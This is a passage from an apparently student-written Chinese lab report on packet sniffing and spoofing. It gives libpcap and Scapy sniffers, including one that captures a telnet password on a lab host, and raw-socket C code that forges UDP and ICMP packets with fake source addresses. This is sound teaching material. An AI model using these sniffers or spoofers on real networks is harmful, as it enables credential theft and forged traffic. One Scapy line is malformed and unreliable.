class="keyword">struct</span> <span class="title">ipheader</span> * <span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *)</span><br><span class="line">            (packet + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ethheader)); </span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;       From: %s\n&quot;</span>, inet_ntoa(ip-&gt;iph_sourceip));   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;         To: %s\n&quot;</span>, inet_ntoa(ip-&gt;iph_destip));    </span><br><span class="line"></span><br><span class="line">        <span class="comment">/* determine protocol */</span></span><br><span class="line">        <span class="keyword">switch</span>(ip-&gt;iph_protocol) &#123;                                 </span><br><span class="line">            <span class="keyword">case</span> IPPROTO_TCP:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   Protocol: TCP\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">case</span> IPPROTO_UDP:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   Protocol: UDP\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">case</span> IPPROTO_ICMP:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   Protocol: ICMP\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;   Protocol: others\n\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pcap_t</span> *handle;</span><br><span class="line">    <span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line">    <span class="type">char</span> filter_exp[] = <span class="string">&quot;tcp and dst portrange 10-100&quot;</span>;</span><br><span class="line">    bpf_u_int32 net;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 1: Open live pcap session on NIC with name enp0s3</span></span><br><span class="line">    handle = pcap_open_live(<span class="string">&quot;enp0s3&quot;</span>, BUFSIZ, <span class="number">1</span>, <span class="number">1000</span>, errbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;listening on network card, ret: %p...\n&quot;</span>, handle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: Compile filter_exp into BPF psuedo-code</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;try to compile filter...\n&quot;</span>);</span><br><span class="line">    pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;try to set filter...\n&quot;</span>);</span><br><span class="line">    pcap_setfilter(handle, &amp;fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 3: Capture packets</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start to sniff...\n&quot;</span>);</span><br><span class="line">    pcap_loop(handle, <span class="number">-1</span>, got_packet, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pcap_close(handle);   <span class="comment">//Close the handle</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码通过使用libpcap库来捕获指定条件的网络数据包，并对捕获到的数据包进行解析和处理：</p><ol><li>结构体定义：<ul><li>ethheader：以太网头部结构体，包含了目标主机地址、源主机地址和协议类型等信息。</li><li>ipheader：IP数据包头部结构体，包含了IP版本、长度、源IP地址、目标IP地址等信息。</li></ul></li><li>got_packet 函数：<ul><li>这是一个回调函数，当捕获到一个数据包时被调用。</li><li>函数的参数解释：<ul><li>args：用户传递的参数，这里没有使用。</li><li>header：捕获到的数据包的头部信息。</li><li>packet：捕获到的数据包的内容。</li></ul></li><li>函数的功能：<ul><li>通过解析数据包的以太网头部和IP头部，打印出源IP地址、目标IP地址和协议类型。</li></ul></li></ul></li><li>main 函数：<ul><li>程序的入口函数。</li><li>主要步骤：<ul><li>打开一个网络设备接口，准备开始捕获数据包。</li><li>编译并设置过滤器，只捕获目的端口在10到100之间的TCP数据包。</li><li>开始捕获数据包并调用 got_packet 函数进行处理。</li><li>循环捕获数据包直到程序结束。</li><li>关闭网络设备接口。</li></ul></li></ul></li></ol><p>使用如下命令编译：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o sniff sniff.c -lpcap</span><br></pre></td></tr></table></figure><p>运行代码，可以看到发送的包出现在结果中：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700373437696-275fce00-86c6-44e8-8c3b-19841dc34cb2.png#averageHue=%23222121&clientId=u453855c7-44f9-4&from=paste&height=340&id=u0fa1ecb8&originHeight=535&originWidth=869&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=52786&status=done&style=none&taskId=ueea1d2a0-eae2-45fc-81d0-8feb3247842&title=&width=551.74605680251" alt="image.png"></p><p>并尝试ping baidu.com：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700373333051-c0a23b05-dc53-47e0-b282-1c285b23cfea.png#averageHue=%23282625&clientId=u453855c7-44f9-4&from=paste&height=211&id=u393401b6&originHeight=333&originWidth=855&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=49895&status=done&style=none&taskId=uc481a6a5-733a-4e92-b3d2-84f0ff8aca6&title=&width=542.8571675099495" alt="image.png"></p><blockquote><p><strong>Q1: 描述在你的嗅探程序中的库函数的调用</strong><br>A1: 第一步，启动pcap监听网卡；第二步就是编译BPF过滤器并设置过滤器；第三步就是设置嗅探的处理函数；最后关闭嗅探即可。</p></blockquote><blockquote><p><strong>Q2: 为什么需要root权限才能运行嗅探程序？不使用root权限运行该程序会在哪里报错？</strong><br>A2: 嗅探数据包是一个高权限的操作，因为涉及到隐私，安全相关问题。如果普通用户也能嗅探数据包，那么他就能窃取别人的隐私，甚至盗取账号密码等等。不使用root权限运行该程序。对比如下，可以看到在没有权限时第一步监听网卡就失败了。</p></blockquote><blockquote><p><strong>Q3: 打开嗅探程序的混杂模式。打开和关闭这个模式有什么区别？</strong><br>A3: 使用混杂模式可以监听所在网段下其他机器的数据包，关闭则不能。打开混杂模式，可以监听到本网段的机器 ping baidu.com的数据包，关闭后则嗅探不到。</p></blockquote><p><a name="lwdGC"></a></p><h4 id="Task-2-1B-Writing-Filters"><a href="#Task-2-1B-Writing-Filters" class="headerlink" title="Task 2.1B: Writing Filters"></a><strong>Task 2.1B: Writing Filters</strong></h4><blockquote><p>请为您的嗅探器程序编写过滤器表达式，以捕获以下每一个内容。你可以在网上找到关于pcap过滤器的手册。在实验室报告中，您需要包括屏幕截图来在应用这些过滤器后显示结果。</p></blockquote><p>这部分还是复用 task 2.1A的代码，只是修改其中的过滤器而已。Pcap过滤器的例子</p><ul><li><strong>只捕捉两个特定主机之间的ICMP包</strong></li></ul><p>使用的过滤器为 icmp and src host 39.156.66.10 and dst host 10.0.2.15, 只捕捉从39.156.66.10（baidu的ip） 发送到 10.0.2.15的ICMP包<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700379272946-0f60ecbe-69c7-467b-85e2-a7bbdb480286.png#averageHue=%2326201f&clientId=u453855c7-44f9-4&from=paste&height=152&id=u4c7778e7&originHeight=240&originWidth=981&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=27041&status=done&style=none&taskId=ue036a88c-d569-433f-9471-11820cc49d6&title=&width=622.8571711429946" alt="image.png"></p><p>结果如下，可以看到全是从百度IP发送到 10.0.2.15的ICMP包，没有其他类型的包<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700377216577-452884d0-80a5-46eb-bf74-edfb8e94b8e8.png#averageHue=%23272625&clientId=u453855c7-44f9-4&from=paste&height=248&id=ua05b103a&originHeight=390&originWidth=854&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=53217&status=done&style=none&taskId=ub4b23a65-a086-4832-a2ed-1dc318730fe&title=&width=542.2222468461952" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700379525287-e5300d93-13dc-4798-8181-7ca098ba5f13.png#averageHue=%23212020&clientId=u453855c7-44f9-4&from=paste&height=446&id=ua78664b9&originHeight=702&originWidth=1042&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=58512&status=done&style=none&taskId=u883d7138-0bff-41f4-9c42-ee4aa188a44&title=&width=661.5873316320085" alt="image.png"></p><ul><li><strong>捕捉目的端口在10到100之间的TCP包</strong></li></ul><p>捕捉目的端口在10到100之间的TCP包：使用的过滤器为 tcp and dst portrange 10-100, 只捕捉TCP包 <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700377959196-b7dfd142-2b05-4e42-8967-9d1dff7dfdd4.png#averageHue=%23251f1f&clientId=u453855c7-44f9-4&from=paste&height=157&id=u0a0f7b56&originHeight=248&originWidth=736&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=24324&status=done&style=none&taskId=uff8a2324-227a-46da-b04e-186510bcdfb&title=&width=467.30160852318454" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700373437696-275fce00-86c6-44e8-8c3b-19841dc34cb2.png#averageHue=%23222121&from=url&height=319&id=TNV92&originHeight=535&originWidth=869&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&status=done&style=none&title=&width=517.53173828125"><br><a name="hXen4"></a></p><h4 id="Task-2-1C-Sniffifing-Passwords"><a href="#Task-2-1C-Sniffifing-Passwords" class="headerlink" title="Task 2.1C: Sniffifing Passwords"></a><strong>Task 2.1C: Sniffifing Passwords</strong></h4><blockquote><p>请显示如何使用你的嗅探程序捕获密码时，有人使用网络，你正在监控。您可能需要修改嗅探器代码，以打印出捕获的TCP数据包的数据部分（telnet使用TCP）。如果您打印出整个数据部分，然后手动标记密码（或其部分密码）的位置，这是可以接受的。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Begin sniffing...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_pkt</span>(<span class="params">pkt</span>):</span><br><span class="line">    pkt.show()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(iface=<span class="string">&#x27;br-9ae40e75e337&#x27;</span>, sniff(<span class="built_in">filter</span>=<span class="string">&quot;tcp port 23&quot;</span>, prn=print_pkt))</span><br></pre></td></tr></table></figure><p>运行改代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 task2<span class="number">.1</span>c.py</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700469012790-8eca4c35-772c-4e5e-9f2a-b574f628f1f2.png#averageHue=%23242423&clientId=u61735c7f-ffb4-4&from=paste&height=57&id=uc1a393c7&originHeight=89&originWidth=733&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=10541&status=done&style=none&taskId=u9a293f5e-a2ca-4d9e-9711-4d84a2cd2be&title=&width=465.39684653192154" alt="image.png"><br />另一边远程登录10.9.0.5<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700469068927-417b0941-05f3-460d-b29b-2720c5bff46a.png#averageHue=%23252423&clientId=u61735c7f-ffb4-4&from=paste&height=342&id=u8c685edb&originHeight=538&originWidth=931&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=60745&status=done&style=none&taskId=u530c595b-93ff-4de7-8d3f-2e0b0ab67d0&title=&width=591.1111379552783" alt="image.png"><br />可以发现嗅探到了密码（捕捉时为单个字符）：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700468615090-56960614-50ef-4b23-99aa-d1ee7f2db75a.png#averageHue=%23232222&clientId=u61735c7f-ffb4-4&from=paste&height=55&id=u646befa3&originHeight=86&originWidth=373&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=2995&status=done&style=none&taskId=uda4594cd-8987-4a92-8529-39d1fca56a5&title=&width=236.8254075803639" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700468632476-22cf6f48-baa3-4170-8122-5f6d057bb8be.png#averageHue=%23242322&clientId=u61735c7f-ffb4-4&from=paste&height=57&id=u14790ea0&originHeight=116&originWidth=487&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=6296&status=done&style=none&taskId=u0a1582ed-6f2d-4b4f-b9c8-617bb1336d8&title=&width=238" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700468682304-f0da2019-3669-4bda-a856-fc35f95ab0da.png#averageHue=%23232222&clientId=u61735c7f-ffb4-4&from=paste&height=58&id=uc90acebe&originHeight=88&originWidth=361&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=3096&status=done&style=none&taskId=uaf5e9e16-7ff8-428d-9aa6-e0b9280a8d3&title=&width=238.20635986328125" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700468698500-e381229a-3e4d-4d00-a8ec-0cf1545b6c83.png#averageHue=%23232221&clientId=u61735c7f-ffb4-4&from=paste&height=51&id=ub73be01b&originHeight=80&originWidth=391&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=3102&status=done&style=none&taskId=u3d54a4a2-000d-4b97-97f3-57f6f539d46&title=&width=248.2539795279418" alt="image.png"><br><a name="BaA5K"></a></p><h3 id="4-2-Task-2-2-Spoofifing"><a href="#4-2-Task-2-2-Spoofifing" class="headerlink" title="4.2 Task 2.2: Spoofifing"></a><strong>4.2 Task 2.2: Spoofifing</strong></h3><blockquote><p>当普通用户发送数据包时，操作系统通常不允许用户设置协议头中的所有字段（如TCP、UDP和IP头）。操作系统将设置大部分字段，而只允许用户设置几个字段，如目标IP地址、目标端口号等。但是，如果用户具有根权限，那么他们可以在数据包头中设置任何任意字段。这被称为数据包欺骗，它可以通过原始套接字来完成。原始套接字为程序员提供了对包构造的绝对控制，允许程序员构造任意的包，包括设置头字段和有效负载。使用原始套接字非常简单；它涉及四个步骤： (1)创建一个原始套接字，(2)设置套接字选项，(3)构造数据包，以及(4)通过原始套接字发送数据包。有许多在线教程可以教你如何在C编程中使用原始套插字。我们已经将一些教程链接到该实验室的网页上。请阅读它们，并学习如何编写一个数据包欺骗程序。我们展示了这样一个程序的一个简单的框架。</p></blockquote><p><a name="ldrV2"></a></p><h4 id="Task-2-2A-Write-a-spoofifing-program"><a href="#Task-2-2A-Write-a-spoofifing-program" class="headerlink" title="Task 2.2A: Write a spoofifing program."></a><strong>Task 2.2A: Write a spoofifing program.</strong></h4><blockquote><p>请用c编写您自己的数据包欺骗程序。您需要提供证据（例如，有线鲨鱼数据包跟踪），以表明您的程序成功地发送了欺骗的IP数据包。</p></blockquote><p>这部分主要是伪造IP包。这里伪造是UDP包, 代码如下(<strong>spoof.c</strong>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************************</span></span><br><span class="line"><span class="comment">Given an IP packet, send it out using a raw socket.</span></span><br><span class="line"><span class="comment">**************************************************************/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_ip_packet</span><span class="params">(<span class="keyword">struct</span> ipheader* ip)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">    <span class="type">int</span> enable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 1: Create a raw network socket.</span></span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sock: %d\n&quot;</span>, sock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: Set socket option.</span></span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">           &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 3: Provide needed information about destination.</span></span><br><span class="line">    dest_info.sin_family = AF_INET;</span><br><span class="line">    dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 4: Send the packet out.</span></span><br><span class="line">    sendto(sock, ip, ntohs(ip-&gt;iph_len), <span class="number">0</span>,</span><br><span class="line">       (<span class="keyword">struct</span> sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>spoof_udp.c:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>   <span class="title function_">send_raw_ip_packet</span> <span class="params">(<span class="keyword">struct</span> ipheader* ip)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">  Spoof a UDP packet using an arbitrary source IP Address and port</span></span><br><span class="line"><span class="comment">*******************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1500</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">1500</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (<span class="keyword">struct</span> ipheader *) buffer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">udpheader</span> *<span class="title">udp</span> =</span> (<span class="keyword">struct</span> udpheader *) (buffer +</span><br><span class="line">                                                 <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 1: Fill in the UDP data field.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">    <span class="type">char</span> *data = buffer + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +</span><br><span class="line">        <span class="keyword">sizeof</span>(<span class="keyword">struct</span> udpheader);</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *msg = <span class="string">&quot;Hello Server!\n&quot;</span>;</span><br><span class="line">    <span class="type">int</span> data_len = <span class="built_in">strlen</span>(msg);</span><br><span class="line">    <span class="built_in">strncpy</span> (data, msg, data_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 2: Fill in the UDP header.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">    udp-&gt;udp_sport = htons(<span class="number">12345</span>);</span><br><span class="line">    udp-&gt;udp_dport = htons(<span class="number">9090</span>);</span><br><span class="line">    udp-&gt;udp_ulen = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> udpheader) + data_len);</span><br><span class="line">    udp-&gt;udp_sum =  <span class="number">0</span>; <span class="comment">/* Many OSes ignore this field, so we do not</span></span><br><span class="line"><span class="comment">                         calculate it. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 3: Fill in the IP header.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">    ip-&gt;iph_ver = <span class="number">4</span>;</span><br><span class="line">    ip-&gt;iph_ihl = <span class="number">5</span>;</span><br><span class="line">    ip-&gt;iph_ttl = <span class="number">20</span>;</span><br><span class="line">    ip-&gt;iph_sourceip.s_addr = inet_addr(<span class="string">&quot;1.2.3.4&quot;</span>);</span><br><span class="line">    ip-&gt;iph_destip.s_addr = inet_addr(<span class="string">&quot;10.0.2.69&quot;</span>);</span><br><span class="line">    ip-&gt;iph_protocol = IPPROTO_UDP; <span class="comment">// The value is 17.</span></span><br><span class="line">    ip-&gt;iph_len = htons(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader) +</span><br><span class="line">                       <span class="keyword">sizeof</span>(<span class="keyword">struct</span> udpheader) + data_len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 4: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">    send_raw_ip_packet (ip);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<strong>gcc -o spoof_udp spoof_udp.c spoof.c -lpcap</strong>编译，<strong>sudo .&#x2F;spoof_udp</strong>运行，查看后台wireshark，可以看到我们伪造的UDP包<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1700471034070-d49d645f-ee88-4b72-ad3b-6e162d8d58c5.png#averageHue=%2365838e&clientId=u61735c7f-ffb4-4&from=paste&height=335&id=uc6e3f1bb&originHeight=527&originWidth=963&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=154313&status=done&style=none&taskId=ue16c6745-3165-4d46-b2d0-f7efaa784a2&title=&width=611.4285991954167" alt="image.png"><br><a name="tpNtR"></a></p><h4 id="Task-2-2B-Spoof-an-ICMP-Echo-Request"><a href="#Task-2-2B-Spoof-an-ICMP-Echo-Request" class="headerlink" title="Task 2.2B: Spoof an ICMP Echo Request"></a><strong>Task 2.2B: Spoof an ICMP Echo Request</strong></h4><p>这部分是伪造ICMP Echo请求。伪造的代码如下, 其中源IP10.9.0.5是局域网内另一个虚拟机的IP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="title function_">in_cksum</span> <span class="params">(<span class="type">unsigned</span> <span class="type">short</span> *buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_raw_ip_packet</span><span class="params">(<span class="keyword">struct</span> ipheader* ip)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">  Spoof an ICMP echo request using an arbitrary source IP Address</span></span><br><span class="line"><span class="comment">*******************************************************************/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> buffer[<span class="number">1500</span>];</span><br><span class="line"></span><br><span class="line">   <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">      Step 1: Fill in the ICMP header.</span></span><br><span class="line"><span class="comment">    ********************************************************/</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">icmpheader</span> *<span class="title">icmp</span> =</span> (<span class="keyword">struct</span> icmpheader *)</span><br><span class="line">                             (buffer + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipheader));</span><br><span class="line">   icmp-&gt;icmp_type = <span class="number">8</span>; <span class="comment">//ICMP Type: 8 is request, 0 is reply.</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// Calculate the checksum for integrity</span></span><br><span class="line">   icmp-&gt;icmp_chksum = <span 